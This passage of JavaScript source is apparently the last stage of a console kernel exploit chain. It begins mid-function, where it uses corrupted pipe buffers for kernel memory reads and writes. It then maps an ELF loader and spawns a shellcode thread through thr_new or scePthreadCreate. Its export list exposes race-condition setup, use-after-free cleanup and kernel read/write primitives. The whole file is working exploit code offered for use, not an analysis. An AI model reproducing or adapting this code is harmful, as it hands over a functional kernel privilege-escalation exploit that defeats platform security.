    flushMark("STAGE5-ARGS", "master=" + S.masterRfd + "." + S.masterWfd +
      "-victim=" + S.victimRfd + "." + S.victimWfd +
      "-allproc=" + hx(allproc) + "-elfldr=" + hx(elfBase) + "-size=0x" +
      elfLen.toString(16),);

    if (o.dryRun) {
      out.ok = true; out.ran = false;

      let freed = false;
      if (elfBase && elfMapped) {
        const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
        freed = !ur.failed;
        queueEvent("STAGE5-MUNMAP", "addr=" + hx(elfBase) + "-size=0x" +
          elfMapped.toString(16) + "-ok=" + freed +
          "-why=dry-run-elfldr-never-handed-over",);
      }
      elfBase = null;
      out.steps.push("dry run: prepared, thread not spawned" +
        (freed ? ", elfldr mapping unmapped" : ""),);
      return out;
    }

    const handleBuf = alloc(8, "stage5-thr-handle");
    const retBuf = alloc(8, "stage5-thr-ret");

    const pbPrep = alloc(PK.PIPEBUF_SIZE, "stage5-pipebuf-prep");
    const pbOut = pbPrep.u8;
    w32(pbOut, 0x00, 0); w32(pbOut, 0x04, 0); w32(pbOut, 0x08, 0);
    w32(pbOut, 0x0c, PK.PIPE_PAGE_SIZE);
    w64(pbOut, 0x10, S.victimPipeData);
    await kwriteFast(S.masterPipeData, pbPrep, PK.PIPEBUF_SIZE);
    const pbBack = await kreadRetry64(S.masterPipeData.add32(0x10));
    const pbHdr = await kreadRetry64(S.masterPipeData);
    const pbOk = pbBack.ret === 8 &&
      pbBack.v.low === S.victimPipeData.low &&
      pbBack.v.hi === S.victimPipeData.hi;
    flushMark("STAGE5-PIPEBUF", "master=" + hx(S.masterPipeData) +
      "-buffer=" + hx(pbBack.v) + "-wantVictim=" + hx(S.victimPipeData) +
      "-cntIn=" + hx(pbHdr.v) + "-ok=" + pbOk,);
    if (!pbOk) {
      out.why = "master pipebuf does not point at the victim pipe " +
        "(buffer=" + hx(pbBack.v) + ", wanted " + hx(S.victimPipeData) + ")";
      return out;
    }

    const method = o.spawn ||
      (typeof window !== "undefined" && window.POOPS_SPAWN) || PK.STAGE5_SPAWN;
    out.spawn = method;
    flushMark("STAGE5-SPAWN",
      "entry=" + hx(entry) + "-args=" + hx(args.base) + "-via=" + method,);

    async function releaseElf() {
      if (!elfBase || !elfMapped) return false;
      const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
      elfBase = null;
      return !ur.failed;
    }

    if (method === "thr_new") {
      const scStack = alloc(PK.STAGE5_THR_STACK, "stage5-thr-stack");
      const scTls = alloc(PK.STAGE5_THR_TLS, "stage5-thr-tls");
      const tidBuf = alloc(8, "stage5-thr-tid");
      const ptidBuf = alloc(8, "stage5-thr-ptid");

      w64(scTls.u8, 0, scTls.base);

      const exitStub = P.syscalls[PSYS.THR_EXIT];
      if (exitStub === undefined) {
        out.why = "no thr_exit stub in the syscall map"; return out;
      }
      for (let q = 1; q <= 16; ++q)
        w64(scStack.u8, PK.STAGE5_THR_STACK - q * 8, exitStub);

      const param = alloc(0x68, "stage5-thr-param");
      w64(param.u8, 0x00, entry); w64(param.u8, 0x08, args.base);
      w64(param.u8, 0x10, scStack.base);
      w64(param.u8, 0x18, i64(PK.STAGE5_THR_STACK, 0));
      w64(param.u8, 0x20, scTls.base);
      w64(param.u8, 0x28, i64(PK.STAGE5_THR_TLS, 0));
      w64(param.u8, 0x30, tidBuf.base); w64(param.u8, 0x38, ptidBuf.base);

      flushMark("STAGE5-THRNEW-PRE", "param=" + hx(param.base) +
        "-entry=" + hx(entry) + "-arg=" + hx(args.base) +
        "-stack=" + hx(scStack.base) + "-size=0x" +
        PK.STAGE5_THR_STACK.toString(16) + "-tls=" + hx(scTls.base) +
        "-retTo=" + hx(exitStub),);

      const tr = await sys(PSYS.THR_NEW, param.base, 0x68);
      const tid = r64(tidBuf.u8, 0);

      flushMark("STAGE5-CREATE-RET", "ret=" + tr.s32 +
        "-failed=" + tr.failed + "-tid=" + hx(tid) + "-thr_new-RETURNED",);
      if (tr.failed || tr.s32 !== 0) {
        out.why = "thr_new failed: " + tr.errText +
          "; thread not created, shellcode did not run";
        return out;
      }
      out.ran = true;
      out.steps.push("thr_new spawned tid " + hx(tid));

      let exited = false, ticks = 0;
      for (; ticks < PK.STAGE5_WAIT_TICKS; ++ticks) {
        await new Promise((r) => setTimeout(r, PK.STAGE5_WAIT_MS));
        if (isZero64(r64(tidBuf.u8, 0))) {
          exited = true; break;
        }
      }
      const waited = (ticks + 1) * PK.STAGE5_WAIT_MS;

      const freed = exited ? await releaseElf() : false;
      out.ok = true; out.shellRet = "n/a (thr_new has no join)";
      flushMark("STAGE5-DONE", "spawn=thr_new-tid=" + hx(tid) +
        "-exited=" + exited + "-waitedMs=" + waited +
        "-elfldrUnmapped=" + freed,);
      out.steps.push(exited ? "shellcode thread exited after " + waited +
        " ms" + (freed ? ", elfldr mapping released" : "") :
        "shellcode thread still alive after " + waited +
          " ms; elfldr mapping left in place",);
      return out;
    }

    const nameBuf = alloc(16, "stage5-thread-name");
    for (let i = 0; i < 5; ++i) nameBuf.u8[i] = "poops".charCodeAt(i);

    let attrBuf = null;
    if (useSizedSceThread) {
      attrBuf = alloc(0x100, "stage5-pthread-attr");
      const attrCalls = [
        ["init", PK.LK_SCE_PTHREAD_ATTR_INIT, [attrBuf.base]],
        ["stacksize", PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE,
          [attrBuf.base, i64(0x80000, 0)],],
        ["detachstate", PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE,
          [attrBuf.base, i64(0, 0)],],
      ];
      for (const [label, off, argv] of attrCalls) {
        await runBuilt("stage5-pthread-attr-" + label, () => {
          armRet(1); emitCallAddr(lkb.add32(off), retPtr(0), ...argv);
        });
        const ar = retOf(0);
        flushMark("STAGE5-ATTR", label + "-ret=" + ar);
        if (ar !== 0) {
          out.why = "scePthreadAttr " + label + " returned " + ar; return out;
        }
      }
    }

    await runBuilt("stage5-thrd-create", () => {
      armRet(1);
      emitCallAddr(tc.addr, retPtr(0), handleBuf.base,
        attrBuf ? attrBuf.base : i64(0, 0), entry, args.base, nameBuf.base,);
    });
    const tcRet = retOf(0);
    const handle = r64(handleBuf.u8, 0);

    if (attrBuf) {
      await runBuilt("stage5-pthread-attr-destroy", () => {
        armRet(1);
        emitCallAddr(lkb.add32(PK.LK_SCE_PTHREAD_ATTR_DESTROY),
          retPtr(0), attrBuf.base,);
      });
      flushMark("STAGE5-ATTR", "destroy-ret=" + retOf(0));
    }

    flushMark("STAGE5-CREATE-RET", "ret=" + tcRet + "-handle=" + hx(handle));
    if (tcRet !== 0) {
      out.why =
        (useSizedSceThread ? "scePthreadCreate" : "pthread_create_name_np") +
        " returned " + tcRet + ", expected 0; shellcode did not run";
      return out;
    }
    out.steps.push("thread spawned, handle " + hx(handle));
    flushMark("STAGE5-JOIN-PRE",
      "handle=" + hx(handle) + "-about-to-join-the-shellcode-thread",);

    await runBuilt("stage5-thrd-join", () => {
      armRet(1); emitCallAddr(tj.addr, retPtr(0), handle, retBuf.base, 0);
    });
    const tjRet = retOf(0);
    const shellRet = r64(retBuf.u8, 0);
    const retStorageReleased = unpin(retBuf, "pthread_join return value consumed",);
    unpin(handleBuf, "pthread handle consumed");
    out.ran = true; out.ok = tjRet === 0; out.shellRet = hx(shellRet);
    out.steps.push("Thrd_join returned " + tjRet +
      ", shellcode returned " + hx(shellRet),);

    let freedElf = false;
    if (elfBase && elfMapped) {
      const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
      freedElf = !ur.failed;
    }
    elfBase = null;
    flushMark("STAGE5-DONE", "joinRet=" + tjRet +
      "-shellcodeRet=" + hx(shellRet) +
      "-retStorageReleased=" + retStorageReleased +
      "-elfldrUnmapped=" + freedElf,);
    if (!out.ok) out.why = "Thrd_join returned " + tjRet;
    return out;
  }

  return {
    PK,
    PSYS,
    TW,
    H,
    S,

    buildBuffers,
    socketpairUnix,
    pipe2Nonblock,
    setupRacerGroups,
    spawnRacers,
    makeRacerGroup,

    flushIovWorkers,
    forceSettled,
    releaseIovAndSettle,
    attemptRace,
    stage0,
    kreadSlow,
    kslow64,
    kslowRead,
    buildUio,
    stage1,
    stage2,
    stage3,
    stage4,
    stage5,
    kwriteSlow,
    findAllproc,
    emitCallAddr,
    findRootvnode,
    findProcByPid,
    kreadFast,
    kwriteFast,
    kread64Fast,
    kread32Fast,
    kwrite64Fast,
    kwrite32Fast,
    fgetFast,
    fholdFast,
    findCurproc,
    removeRthrFromSocket,
    removeUafFile,
    prepareFds,
    openFreeFdSource,
    pickBurnCores,

    buildBurnWorker,
    RACER_FIELDS,
    crfree,
    triggerNetcontrol,
    armLineA,
    yieldN,
    sleepK,
    alloc,
    runBuilt,
    emit,
    retPtr,
    retOf,
    armRet,
    needStub,
    bankFd,
    emitFreeRthdr,
    emitGetRthdr,
    cleanup: cleanupOnce,
    unblockGroup,
    verdict,
    STEPS,
    terminateBurn,
    releaseUioAndSettle,
    drainUioBuffer,

    get triggered() {
      return S.triggered;
    },
    get corrupt() {
      return TW.corrupt;
    },
    get triplets() {
      return TW.S.triplets;
    },
    get kernelWrites() {
      return S.kernelWrites;
    },
    setFamily(f) {
      S.triggerFamily = f;
      return f;
    },
    setPipes(m, mw, v, vw) {
      S.masterRfd = m;
      S.masterWfd = mw;
      S.victimRfd = v;
      S.victimWfd = vw;
    },
    setSocketpairs(ia, ib, ua, ub) {
      S.iovSockA = ia;
      S.iovSockB = ib;
      S.uioSockA = ua;
      S.uioSockB = ub;
    },
  };
}

